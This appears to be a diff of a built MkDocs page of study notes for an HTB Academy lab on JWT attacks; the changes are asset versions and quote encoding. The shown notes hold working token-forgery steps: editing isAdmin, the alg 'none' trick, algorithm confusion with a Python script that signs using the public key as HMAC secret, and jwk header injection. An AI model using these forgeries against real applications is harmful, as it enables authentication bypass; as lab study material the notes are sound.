@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -27,7 +27,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -2461,18 +2461,18 @@
 <span class="normal">16</span>
 <span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="c1">// header</span>
 </span><span id="__span-0-2"><span class="p">{</span>
-</span><span id="__span-0-3"><span class="w">  </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span><span class="w"> </span><span class="c1">// signature or MAC algorithm used</span>
-</span><span id="__span-0-4"><span class="w">  </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span>
+</span><span id="__span-0-3"><span class="w">  </span><span class="nt">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HS256"</span><span class="p">,</span><span class="w"> </span><span class="c1">// signature or MAC algorithm used</span>
+</span><span id="__span-0-4"><span class="w">  </span><span class="nt">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span>
 </span><span id="__span-0-5"><span class="p">}</span>
 </span><span id="__span-0-6">
 </span><span id="__span-0-7"><span class="c1">// payload</span>
 </span><span id="__span-0-8"><span class="p">{</span>
-</span><span id="__span-0-9"><span class="w">  </span><span class="nt">&quot;iss&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HTB-Academy&quot;</span><span class="p">,</span>
-</span><span id="__span-0-10"><span class="w">  </span><span class="nt">&quot;user&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span>
-</span><span id="__span-0-11"><span class="w">  </span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+</span><span id="__span-0-9"><span class="w">  </span><span class="nt">"iss"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HTB-Academy"</span><span class="p">,</span>
+</span><span id="__span-0-10"><span class="w">  </span><span class="nt">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span>
+</span><span id="__span-0-11"><span class="w">  </span><span class="nt">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
 </span><span id="__span-0-12"><span class="p">}</span>
 </span><span id="__span-0-13">
-</span><span id="__span-0-14"><span class="c1">// signature is computed based on the JWT&#39;s header, payload, and a secret signing key</span>
+</span><span id="__span-0-14"><span class="c1">// signature is computed based on the JWT's header, payload, and a secret signing key</span>
 </span><span id="__span-0-15">
 </span><span id="__span-0-16"><span class="c1">// final format is header.payload.signature:</span>
 </span><span id="__span-0-17"><span class="err">eyJhbGciOiJIUzI</span><span class="mi">1</span><span class="err">NiIsI</span><span class="kc">n</span><span class="err">R</span><span class="mi">5</span><span class="err">cCI</span><span class="mi">6</span><span class="err">IkpXVCJ</span><span class="mf">9.e</span><span class="err">yJpc</span><span class="mi">3</span><span class="err">MiOiJIVEI</span><span class="kc">t</span><span class="err">QWNhZGV</span><span class="kc">te</span><span class="err">SIsI</span><span class="kc">n</span><span class="err">VzZXIiOiJhZG</span><span class="mi">1</span><span class="err">pbiIsImlzQWR</span><span class="kc">ta</span><span class="err">W</span><span class="mi">4</span><span class="err">iO</span><span class="kc">n</span><span class="err">RydWV</span><span class="mf">9.</span><span class="err">Ch</span><span class="kc">n</span><span class="err">hj</span><span class="mi">-</span><span class="err">ATkcO</span><span class="kc">f</span><span class="err">j</span><span class="kc">tn</span><span class="mi">8</span><span class="err">GCHYvpNE</span><span class="mi">-9</span><span class="err">dmlhKTCUwl</span><span class="mi">6</span><span class="err">pxTZEA</span>
@@ -2488,9 +2488,9 @@
 <span class="normal">3</span>
 <span class="normal">4</span>
 <span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="p">{</span>
-</span><span id="__span-1-2"><span class="w">  </span><span class="nt">&quot;user&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;htb-stdnt&quot;</span><span class="p">,</span>
-</span><span id="__span-1-3"><span class="w">  </span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="c1">// amend to true</span>
-</span><span id="__span-1-4"><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1781047597</span>
+</span><span id="__span-1-2"><span class="w">  </span><span class="nt">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"htb-stdnt"</span><span class="p">,</span>
+</span><span id="__span-1-3"><span class="w">  </span><span class="nt">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="c1">// amend to true</span>
+</span><span id="__span-1-4"><span class="w">  </span><span class="nt">"exp"</span><span class="p">:</span><span class="w"> </span><span class="mi">1781047597</span>
 </span><span id="__span-1-5"><span class="p">}</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>Refresh landing page with with amended token</li>
@@ -2506,11 +2506,11 @@
 <span class="normal">3</span>
 <span class="normal">4</span>
 <span class="normal">5</span>
-<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="p">{</span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;none&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">}</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="p">{</span><span class="nt">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"none"</span><span class="p">,</span><span class="w"> </span><span class="nt">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">}</span>
 </span><span id="__span-2-2"><span class="p">{</span><span class="w"> </span>
-</span><span id="__span-2-3"><span class="w">  </span><span class="nt">&quot;user&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;htb-stdnt&quot;</span><span class="p">,</span>
-</span><span id="__span-2-4"><span class="w">  </span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span>
-</span><span id="__span-2-5"><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1781047597</span>
+</span><span id="__span-2-3"><span class="w">  </span><span class="nt">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"htb-stdnt"</span><span class="p">,</span>
+</span><span id="__span-2-4"><span class="w">  </span><span class="nt">"isAdmin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span>
+</span><span id="__span-2-5"><span class="w">  </span><span class="nt">"exp"</span><span class="p">:</span><span class="w"> </span><span class="mi">1781047597</span>
 </span><span id="__span-2-6"><span class="p">}</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>In <a href="https://gchq.github.io/CyberChef/">CyberChef</a> set "to base64" and select "URL safe" from the drop down</li>
@@ -2576,9 +2576,9 @@ Works if the web application uses the algorithm specified in the alg-claim of th
 </span><span id="__span-4-8">
 </span><span id="__span-4-9"><span class="c1"># multiple results returned:</span>
 </span><span id="__span-4-10"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Written<span class="w"> </span>to<span class="w"> </span>b1969268f0e66b1c_65537_x509.pem
-</span><span id="__span-4-11"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Tampered<span class="w"> </span>JWT:<span class="w"> </span>b<span class="s1">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs&#39;</span>
+</span><span id="__span-4-11"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Tampered<span class="w"> </span>JWT:<span class="w"> </span>b<span class="s1">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs'</span>
 </span><span id="__span-4-12"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Written<span class="w"> </span>to<span class="w"> </span>b1969268f0e66b1c_65537_pkcs1.pem
-</span><span id="__span-4-13"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Tampered<span class="w"> </span>JWT:<span class="w"> </span>b<span class="s1">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.gzm7wCp4TP4xvsxw-hF23cbCNEGhVtWsFNj3yopYgqk&#39;</span>
+</span><span id="__span-4-13"><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Tampered<span class="w"> </span>JWT:<span class="w"> </span>b<span class="s1">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.gzm7wCp4TP4xvsxw-hF23cbCNEGhVtWsFNj3yopYgqk'</span>
 </span></code></pre></div></td></tr></table></div></li>
 <li>Back on <a href="https://jwt.lannysport.net/">JWT Debugger</a> past the generated JWT to confirm that it indeed uses a symmetric signature algorithm (HS256)</li>
 <li>Send the generated JWTs as session token to landing page request to conifirm which one is accepted and that app is vulnerable to algorithm confusion
@@ -2619,38 +2619,38 @@ Works if the web application uses the algorithm specified in the alg-claim of th
 <span class="normal">35</span>
 <span class="normal">36</span>
 <span class="normal">37</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="c1"># Forge the JWT using the working JWT and the corresponding .pem file, changing isAdmin to true</span>
-</span><span id="__span-5-2">cat<span class="w"> </span>&gt;<span class="w"> </span>forge_admin.py<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+</span><span id="__span-5-2">cat<span class="w"> </span>&gt;<span class="w"> </span>forge_admin.py<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
 </span><span id="__span-5-3"><span class="s">import base64</span>
 </span><span id="__span-5-4"><span class="s">import hmac</span>
 </span><span id="__span-5-5"><span class="s">import hashlib</span>
 </span><span id="__span-5-6"><span class="s">import json</span>
 </span><span id="__span-5-7">
 </span><span id="__span-5-8"><span class="s"># === WORKING TOKEN FROM jwt_forgery.py ===</span>
-</span><span id="__span-5-9"><span class="s">working_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs&quot;</span>
+</span><span id="__span-5-9"><span class="s">working_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjogImh0Yi1zdGRudCIsICJpc0FkbWluIjogZmFsc2UsICJleHAiOiAxNzgxMTkyNjEwfQ.0gp7VdPNIS4bgSUmav9EbBdN9koB3uCg2MezFuAF_Qs"</span>
 </span><span id="__span-5-10">
 </span><span id="__span-5-11"><span class="s"># Split</span>
-</span><span id="__span-5-12"><span class="s">header_b64, payload_b64, _ = working_token.split(&#39;.&#39;)</span>
+</span><span id="__span-5-12"><span class="s">header_b64, payload_b64, _ = working_token.split('.')</span>
 </span><span id="__span-5-13">
 </span><span id="__span-5-14"><span class="s"># New payload</span>
-</span><span id="__span-5-15"><span class="s">payload = json.loads(base64.urlsafe_b64decode(payload_b64 + &#39;==&#39;).decode())</span>
-</span><span id="__span-5-16"><span class="s">payload[&quot;isAdmin&quot;] = True</span>
+</span><span id="__span-5-15"><span class="s">payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '==').decode())</span>
+</span><span id="__span-5-16"><span class="s">payload["isAdmin"] = True</span>
 </span><span id="__span-5-17">
 </span><span id="__span-5-18"><span class="s">new_payload_b64 = base64.urlsafe_b64encode(</span>
-</span><span id="__span-5-19"><span class="s">    json.dumps(payload, separators=(&quot;,&quot;, &quot;:&quot;)).encode()</span>
-</span><span id="__span-5-20"><span class="s">).rstrip(b&#39;=&#39;).decode()</span>
+</span><span id="__span-5-19"><span class="s">    json.dumps(payload, separators=(",", ":")).encode()</span>
+</span><span id="__span-5-20"><span class="s">).rstrip(b'=').decode()</span>
 </span><span id="__span-5-21">
 </span><span id="__span-5-22"><span class="s"># Use the corresponding pem key that worked</span>
-</span><span id="__span-5-23"><span class="s">with open(&quot;b1969268f0e66b1c_65537_x509.pem&quot;, &quot;rb&quot;) as f:</span>
+</span><span id="__span-5-23"><span class="s">with open("b1969268f0e66b1c_65537_x509.pem", "rb") as f:</span>
 </span><span id="__span-5-24"><span class="s">    key = f.read().strip()</span>
 </span><span id="__span-5-25">
 </span><span id="__span-5-26"><span class="s"># Sign</span>
-</span><span id="__span-5-27"><span class="s">signing_input = f&quot;{header_b64}.{new_payload_b64}&quot;.encode()</span>
+</span><span id="__span-5-27"><span class="s">signing_input = f"{header_b64}.{new_payload_b64}".encode()</span>
 </span><span id="__span-5-28"><span class="s">signature = hmac.new(key, signing_input, hashlib.sha256).digest()</span>
-</span><span id="__span-5-29"><span class="s">sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b&#39;=&#39;).decode()</span>
+</span><span id="__span-5-29"><span class="s">sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()</span>
 </span><span id="__span-5-30">
-</span><span id="__span-5-31"><span class="s">print(&quot;=== ADMIN TOKEN ===&quot;)</span>
-</span><span id="__span-5-32"><span class="s">print(f&quot;{header_b64}.{new_payload_b64}.{sig_b64}&quot;)</span>
-</span><span id="__span-5-33"><span class="s">print(&quot;===================&quot;)</span>
+</span><span id="__span-5-31"><span class="s">print("=== ADMIN TOKEN ===")</span>
+</span><span id="__span-5-32"><span class="s">print(f"{header_b64}.{new_payload_b64}.{sig_b64}")</span>
+</span><span id="__span-5-33"><span class="s">print("===================")</span>
 </span><span id="__span-5-34"><span class="s">EOF</span>
 </span><span id="__span-5-35">
 </span><span id="__span-5-36"><span class="c1"># run the script</span>
@@ -2701,19 +2701,19 @@ Works if the web application uses the algorithm specified in the alg-claim of th
 </span><span id="__span-7-4"><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
 </span><span id="__span-7-5">
 </span><span id="__span-7-6"><span class="c1"># JWT Payload</span>
-</span><span id="__span-7-7"><span class="n">jwt_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;htb-stdnt&#39;</span><span class="p">,</span> <span class="s1">&#39;isAdmin&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">}</span>
+</span><span id="__span-7-7"><span class="n">jwt_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'user'</span><span class="p">:</span> <span class="s1">'htb-stdnt'</span><span class="p">,</span> <span class="s1">'isAdmin'</span><span class="p">:</span> <span class="kc">True</span><span class="p">}</span>
 </span><span id="__span-7-8">
 </span><span id="__span-7-9"><span class="c1"># convert PEM to JWK</span>
-</span><span id="__span-7-10"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;exploit_public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-7-10"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'exploit_public.pem'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 </span><span id="__span-7-11">    <span class="n">public_key_pem</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 </span><span id="__span-7-12"><span class="n">public_key</span> <span class="o">=</span> <span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_public_key</span><span class="p">(</span><span class="n">public_key_pem</span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
-</span><span id="__span-7-13"><span class="n">jwk_key</span> <span class="o">=</span> <span class="n">jwk</span><span class="o">.</span><span class="n">construct</span><span class="p">(</span><span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;RS256&#39;</span><span class="p">)</span>
+</span><span id="__span-7-13"><span class="n">jwk_key</span> <span class="o">=</span> <span class="n">jwk</span><span class="o">.</span><span class="n">construct</span><span class="p">(</span><span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">'RS256'</span><span class="p">)</span>
 </span><span id="__span-7-14"><span class="n">jwk_dict</span> <span class="o">=</span> <span class="n">jwk_key</span><span class="o">.</span><span class="n">to_dict</span><span class="p">()</span>
 </span><span id="__span-7-15">
 </span><span id="__span-7-16"><span class="c1"># forge JWT</span>
-</span><span id="__span-7-17"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;exploit_private.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-7-17"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'exploit_private.pem'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 </span><span id="__span-7-18">    <span class="n">private_key_pem</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-7-19"><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">jwt_payload</span><span class="p">,</span> <span class="n">private_key_pem</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;RS256&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;jwk&#39;</span><span class="p">:</span> <span class="n">jwk_dict</span><span class="p">})</span>
+</span><span id="__span-7-19"><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">jwt_payload</span><span class="p">,</span> <span class="n">private_key_pem</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">'RS256'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">'jwk'</span><span class="p">:</span> <span class="n">jwk_dict</span><span class="p">})</span>
 </span><span id="__span-7-20">
 </span><span id="__span-7-21"><span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
 </span></code></pre></div></td></tr></table></div>
@@ -2801,7 +2801,7 @@ Works if the web application uses the algorithm specified in the alg-claim of th
       <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
     
   </body>
